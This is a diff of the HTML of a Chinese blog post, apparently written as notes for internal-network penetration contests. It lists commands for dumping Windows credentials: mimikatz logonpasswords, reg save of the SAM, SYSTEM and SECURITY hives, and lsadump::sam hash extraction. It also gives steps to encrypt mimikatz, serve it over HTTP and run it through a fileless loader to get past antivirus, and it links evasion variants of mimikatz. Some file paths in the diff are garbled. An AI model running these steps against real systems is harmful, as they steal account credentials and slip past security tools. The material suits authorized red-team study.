@@ -6,21 +6,19 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="前言随着在大型比赛中内网越来越重要，打内网的机会越来越多，在此记录一些常用的内网渗透技巧&#x2F;命令&#x2F;工具,省的每次用都要去搜，机会是留给有准备的人的，你准备的越充分，机会到来的时候，你就越不会慌张。 正文在Windows环境中抓密码工具 搞安全谁不知道这个工具mimikatz  微软官方的工具，带数字签名，有一定的免杀效果但不多procdump  SqlDumper，默认存放在C:">
+    <meta name="description" content="前言 随着在大型比赛中内网越来越重要，打内网的机会越来越多，在此记录一些常用的内网渗透技巧&#x2F;命令&#x2F;工具,省的每次用都要去搜，机会是留给有准备的人的，你准备的越充分，机会到来的时候，你就越不会慌张。 正文 在Windows环境中抓密码 工具  搞安全谁不知道这个工具mimikatz 微软官方的工具，带数字签名，有一定的免杀效果但不多procdump SqlDumper，默认存放在C:FilesSQL">
 <meta property="og:type" content="article">
 <meta property="og:title" content="内网渗透记录">
 <meta property="og:url" content="https://blog.njcit.me/2023/01/18/%E5%86%85%E7%BD%91/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/index.html">
 <meta property="og:site_name" content="这里有一个网站">
-<meta property="og:description" content="前言随着在大型比赛中内网越来越重要，打内网的机会越来越多，在此记录一些常用的内网渗透技巧&#x2F;命令&#x2F;工具,省的每次用都要去搜，机会是留给有准备的人的，你准备的越充分，机会到来的时候，你就越不会慌张。 正文在Windows环境中抓密码工具 搞安全谁不知道这个工具mimikatz  微软官方的工具，带数字签名，有一定的免杀效果但不多procdump  SqlDumper，默认存放在C:">
+<meta property="og:description" content="前言 随着在大型比赛中内网越来越重要，打内网的机会越来越多，在此记录一些常用的内网渗透技巧&#x2F;命令&#x2F;工具,省的每次用都要去搜，机会是留给有准备的人的，你准备的越充分，机会到来的时候，你就越不会慌张。 正文 在Windows环境中抓密码 工具  搞安全谁不知道这个工具mimikatz 微软官方的工具，带数字签名，有一定的免杀效果但不多procdump SqlDumper，默认存放在C:FilesSQL">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://blog.njcit.me/source/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/217600375-ed3f0f48-f9a5-4bf9-839c-8561c4679479.png">
 <meta property="article:published_time" content="2023-01-18T03:05:52.000Z">
 <meta property="article:modified_time" content="2023-05-05T01:37:22.465Z">
 <meta property="article:author" content="ccadmin">
 <meta property="article:tag" content="内网渗透">
 <meta property="article:tag" content="渗透测试">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://blog.njcit.me/source/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/217600375-ed3f0f48-f9a5-4bf9-839c-8561c4679479.png">
     
     
       
@@ -110,7 +108,7 @@
 
     </div>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%AD%A3%E6%96%87"><span class="toc-number">2.</span> <span class="toc-text">正文</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A8Windows%E7%8E%AF%E5%A2%83%E4%B8%AD%E6%8A%93%E5%AF%86%E7%A0%81"><span class="toc-number">2.1.</span> <span class="toc-text">在Windows环境中抓密码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7"><span class="toc-number">2.1.1.</span> <span class="toc-text">工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">2.1.2.</span> <span class="toc-text">使用命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E7%94%A8%E5%85%8D%E6%9D%80"><span class="toc-number">2.1.3.</span> <span class="toc-text">通用免杀</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87sam-system%E6%96%87%E4%BB%B6%E6%8F%90%E5%8F%96hash"><span class="toc-number">2.1.4.</span> <span class="toc-text">通过sam system文件提取hash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mimikatz%E5%85%8D%E6%9D%80"><span class="toc-number">2.1.5.</span> <span class="toc-text">mimikatz免杀</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">3.</span> <span class="toc-text">参考链接</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%AD%A3%E6%96%87"><span class="toc-number">2.</span> <span class="toc-text">正文</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A8windows%E7%8E%AF%E5%A2%83%E4%B8%AD%E6%8A%93%E5%AF%86%E7%A0%81"><span class="toc-number">2.1.</span> <span class="toc-text">在Windows环境中抓密码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7"><span class="toc-number">2.1.1.</span> <span class="toc-text">工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">2.1.2.</span> <span class="toc-text">使用命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E7%94%A8%E5%85%8D%E6%9D%80"><span class="toc-number">2.1.3.</span> <span class="toc-text">通用免杀</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87sam-system%E6%96%87%E4%BB%B6%E6%8F%90%E5%8F%96hash"><span class="toc-number">2.1.4.</span> <span class="toc-text">通过sam system文件提取hash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mimikatz%E5%85%8D%E6%9D%80"><span class="toc-number">2.1.5.</span> <span class="toc-text">mimikatz免杀</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">3.</span> <span class="toc-text">参考链接</span></a></li></ol>
     </div>
   </span>
 </div>
@@ -154,63 +152,71 @@
   
 
   <div class="content" itemprop="articleBody">
-    <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>随着在大型比赛中内网越来越重要，打内网的机会越来越多，在此记录一些常用的内网渗透技巧&#x2F;命令&#x2F;工具,省的每次用都要去搜，机会是留给有准备的人的，你准备的越充分，机会到来的时候，你就越不会慌张。</p>
-<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="在Windows环境中抓密码"><a href="#在Windows环境中抓密码" class="headerlink" title="在Windows环境中抓密码"></a>在Windows环境中抓密码</h2><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><ul>
-<li><p>搞安全谁不知道这个工具<a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz">mimikatz</a></p>
-</li>
-<li><p>微软官方的工具，带数字签名，有一定的免杀效果但不多<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/procdump">procdump</a></p>
-</li>
-<li><p>SqlDumper，默认存放在C:\Program Files\Microsoft SQL Server\number\Shared，number代表SQL Server的版本。</p>
-</li>
-<li><p>powershell脚本<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1">Invoke-Mimikatz</a></p>
-</li>
-<li><p>之前能过卡巴斯基dump lsass的工具<a target="_blank" rel="noopener" href="https://gist.github.com/xpn/c7f6d15bf15750eae3ec349e7ec2380e">xpn</a></p>
-</li>
+    <h1 id="前言">前言</h1>
+<p>随着在大型比赛中内网越来越重要，打内网的机会越来越多，在此记录一些常用的内网渗透技巧/命令/工具,省的每次用都要去搜，机会是留给有准备的人的，你准备的越充分，机会到来的时候，你就越不会慌张。</p>
+<h1 id="正文">正文</h1>
+<h2 id="在windows环境中抓密码">在Windows环境中抓密码</h2>
+<h3 id="工具">工具</h3>
+<ul>
+<li><p>搞安全谁不知道这个工具<a
+target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz">mimikatz</a></p></li>
+<li><p>微软官方的工具，带数字签名，有一定的免杀效果但不多<a
+target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/procdump">procdump</a></p></li>
+<li><p>SqlDumper，默认存放在C:FilesSQL Server，number代表SQL
+Server的版本。</p></li>
+<li><p>powershell脚本<a
+target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1">Invoke-Mimikatz</a></p></li>
+<li><p>之前能过卡巴斯基dump lsass的工具<a
+target="_blank" rel="noopener" href="https://gist.github.com/xpn/c7f6d15bf15750eae3ec349e7ec2380e">xpn</a></p></li>
 </ul>
-<h3 id="使用命令"><a href="#使用命令" class="headerlink" title="使用命令"></a>使用命令</h3><ul>
-<li>mimikatz<br>交互模式<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure></li>
+<h3 id="使用命令">使用命令</h3>
+<ul>
+<li>mimikatz 交互模式 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure></li>
 </ul>
 <p>一句话模式</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;&quot;</span>privilege::debug<span class="string">&quot;&quot;</span> <span class="string">&quot;&quot;</span>log sekurlsa::logonpasswords full<span class="string">&quot;&quot;</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
-
-<p>配合sam和system文件,文件位置C:\Windows\System32\config，默认情况下由于文件占用无法复制出来，可以使用以下命令保存。火绒居然不拦截，果然装火绒就是图一乐。</p>
+<p>配合sam和system文件,文件位置C:，默认情况下由于文件占用无法复制出来，可以使用以下命令保存。火绒居然不拦截，果然装火绒就是图一乐。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM SystemBkup.hiv</span><br><span class="line">reg save HKLM\SAM SamBkup.hiv</span><br></pre></td></tr></table></figure>
-
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;lsadump::sam /system:sys.hiv /sam:sam.hiv&quot;</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
-<h3 id="通用免杀"><a href="#通用免杀" class="headerlink" title="通用免杀"></a>通用免杀</h3><p>链接：<a target="_blank" rel="noopener" href="https://github.com/TheD1rkMtr/FilelessPELoader">https://github.com/TheD1rkMtr/FilelessPELoader</a>  </p>
-<p>简易教程  </p>
+<h3 id="通用免杀">通用免杀</h3>
+<p>链接：<a
+target="_blank" rel="noopener" href="https://github.com/TheD1rkMtr/FilelessPELoader">https://github.com/TheD1rkMtr/FilelessPELoader</a></p>
+<p>简易教程</p>
 <p>server</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/TheD1rkMtr/FilelessPELoader</span><br><span class="line"><span class="built_in">cd</span> FilelessPELoader</span><br><span class="line"><span class="built_in">rm</span> mimikatz.exe</span><br><span class="line">wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip</span><br><span class="line">7z x mimikatz_trunk.zip</span><br><span class="line"><span class="built_in">mv</span> x64/mimikatz.exe  .</span><br><span class="line">python3 aes.py mimikatz.exe</span><br><span class="line"><span class="comment">## 启动http 服务</span></span><br><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure>
-
 <p>client</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cl /EHsc FilelessPELoader.cpp</span><br></pre></td></tr></table></figure>
-
 <p>或者使用Visual Studio 2022编译</p>
 <p>使用</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FilelessPELoader.exe 10.0.0.114 8000 cipher.bin key.bin</span><br></pre></td></tr></table></figure>
-
 <p>借用项目的图</p>
-<p><img src="/../../source/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/217600375-ed3f0f48-f9a5-4bf9-839c-8561c4679479.png" alt="filelessremotepe"></p>
-<h3 id="通过sam-system文件提取hash"><a href="#通过sam-system文件提取hash" class="headerlink" title="通过sam system文件提取hash"></a>通过sam system文件提取hash</h3><p>使用注册表导出</p>
+<figure>
+<img
+src="../../source/images/内网渗透记录/217600375-ed3f0f48-f9a5-4bf9-839c-8561c4679479.png"
+alt="filelessremotepe" />
+<figcaption aria-hidden="true">filelessremotepe</figcaption>
+</figure>
+<h3 id="通过sam-system文件提取hash">通过sam system文件提取hash</h3>
+<p>使用注册表导出</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SAM sam.hiv</span><br><span class="line">reg save HKLM\SYSTEM system.hiv</span><br><span class="line">reg save HKLM\SECURITY security.hiv</span><br></pre></td></tr></table></figure>
-
-<p>在pe模式下可以直接从C:\Windows\System32\config\复制上述文件</p>
+<p>在pe模式下可以直接从C:</p>
 <p>用mimikatz提取hash</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe </span><br><span class="line">lsadump::sam /sam:sam.hiv /system:system.hiv</span><br></pre></td></tr></table></figure>
-
-<h3 id="mimikatz免杀"><a href="#mimikatz免杀" class="headerlink" title="mimikatz免杀"></a>mimikatz免杀</h3><ul>
-<li><p><a target="_blank" rel="noopener" href="https://github.com/wheelerlaw/go-mimikatz">https://github.com/wheelerlaw/go-mimikatz</a></p>
-</li>
-<li><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10821">https://xz.aliyun.com/t/10821</a></p>
-</li>
-<li><p><a target="_blank" rel="noopener" href="https://github.com/crow821/crowsec">https://github.com/crow821/crowsec</a></p>
-</li>
+<h3 id="mimikatz免杀">mimikatz免杀</h3>
+<ul>
+<li><p><a
+target="_blank" rel="noopener" href="https://github.com/wheelerlaw/go-mimikatz">https://github.com/wheelerlaw/go-mimikatz</a></p></li>
+<li><p><a
+target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10821">https://xz.aliyun.com/t/10821</a></p></li>
+<li><p><a
+target="_blank" rel="noopener" href="https://github.com/crow821/crowsec">https://github.com/crow821/crowsec</a></p></li>
 </ul>
-<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul>
-<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/231880.html">https://www.freebuf.com/articles/web/231880.html</a></li>
-<li><a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a></li>
-<li><a target="_blank" rel="noopener" href="https://ssooking.github.io/2020/07/mimikatz%E6%8A%93%E5%8F%96%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81/">https://ssooking.github.io/2020/07/mimikatz%E6%8A%93%E5%8F%96%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81/</a></li>
-<li><a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%80%9A%E8%BF%87SAM%E6%95%B0%E6%8D%AE%E5%BA%93%E8%8E%B7%E5%BE%97%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7hash">https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%80%9A%E8%BF%87SAM%E6%95%B0%E6%8D%AE%E5%BA%93%E8%8E%B7%E5%BE%97%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7hash</a></li>
+<h1 id="参考链接">参考链接</h1>
+<ul>
+<li>https://www.freebuf.com/articles/web/231880.html</li>
+<li>https://github.com/PowerShellMafia/PowerSploit</li>
+<li>https://ssooking.github.io/2020/07/mimikatz%E6%8A%93%E5%8F%96%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81/</li>
+<li>https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%80%9A%E8%BF%87SAM%E6%95%B0%E6%8D%AE%E5%BA%93%E8%8E%B7%E5%BE%97%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7hash</li>
 </ul>
 
   </div>
@@ -237,7 +243,7 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%AD%A3%E6%96%87"><span class="toc-number">2.</span> <span class="toc-text">正文</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A8Windows%E7%8E%AF%E5%A2%83%E4%B8%AD%E6%8A%93%E5%AF%86%E7%A0%81"><span class="toc-number">2.1.</span> <span class="toc-text">在Windows环境中抓密码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7"><span class="toc-number">2.1.1.</span> <span class="toc-text">工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">2.1.2.</span> <span class="toc-text">使用命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E7%94%A8%E5%85%8D%E6%9D%80"><span class="toc-number">2.1.3.</span> <span class="toc-text">通用免杀</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87sam-system%E6%96%87%E4%BB%B6%E6%8F%90%E5%8F%96hash"><span class="toc-number">2.1.4.</span> <span class="toc-text">通过sam system文件提取hash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mimikatz%E5%85%8D%E6%9D%80"><span class="toc-number">2.1.5.</span> <span class="toc-text">mimikatz免杀</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">3.</span> <span class="toc-text">参考链接</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%AD%A3%E6%96%87"><span class="toc-number">2.</span> <span class="toc-text">正文</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A8windows%E7%8E%AF%E5%A2%83%E4%B8%AD%E6%8A%93%E5%AF%86%E7%A0%81"><span class="toc-number">2.1.</span> <span class="toc-text">在Windows环境中抓密码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7"><span class="toc-number">2.1.1.</span> <span class="toc-text">工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">2.1.2.</span> <span class="toc-text">使用命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E7%94%A8%E5%85%8D%E6%9D%80"><span class="toc-number">2.1.3.</span> <span class="toc-text">通用免杀</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87sam-system%E6%96%87%E4%BB%B6%E6%8F%90%E5%8F%96hash"><span class="toc-number">2.1.4.</span> <span class="toc-text">通过sam system文件提取hash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mimikatz%E5%85%8D%E6%9D%80"><span class="toc-number">2.1.5.</span> <span class="toc-text">mimikatz免杀</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">3.</span> <span class="toc-text">参考链接</span></a></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
